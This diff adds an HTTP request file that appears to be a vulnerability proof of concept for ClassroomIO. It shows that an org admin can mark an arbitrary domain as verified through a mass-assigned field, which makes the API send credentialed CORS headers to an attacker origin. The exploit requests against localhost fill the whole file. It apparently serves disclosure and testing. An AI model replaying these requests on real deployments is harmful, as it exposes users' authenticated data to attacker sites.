@@ -1,0 +1,33 @@
+### VULN-021 — isCustomDomainVerified mass-assignment -> instance-wide credentialed-CORS trust
+### <EVIL> = an attacker-chosen hostname (random per run, e.g. evil-<hex>.example)
+
+### [baseline] Untrusted origin is NOT reflected.
+GET http://localhost:21527/
+Origin: http://<EVIL>
+### -> (no Access-Control-Allow-Origin header)
+
+### [poison] Org admin self-asserts the domain is verified (NO DNS/ownership check).
+PUT http://localhost:21527/organization
+Cookie: classroomio.session_token=<ADMIN_SESSION>
+cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
+Content-Type: application/json
+
+{"customDomain":"<EVIL>","isCustomDomainVerified":true}
+### -> HTTP 200; DB now organization.customDomain=<EVIL>, isCustomDomainVerified=true;
+###    trustCustomDomainHostname(<EVIL>) added it to the process-wide verified set.
+
+### [proof] The SAME untrusted origin is now reflected WITH credentials.
+GET http://localhost:21527/
+Origin: http://<EVIL>
+### -> Access-Control-Allow-Origin: http://<EVIL>
+### -> Access-Control-Allow-Credentials: true
+###    A page on http://<EVIL> can now read authenticated API responses cross-origin.
+
+### [restore] Untrust + clear the org row (exploit does this automatically).
+PUT http://localhost:21527/organization
+Cookie: classroomio.session_token=<ADMIN_SESSION>
+cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
+Content-Type: application/json
+
+{"customDomain":null,"isCustomDomainVerified":false}
+### -> HTTP 200; <EVIL> untrusted again (no longer reflected).
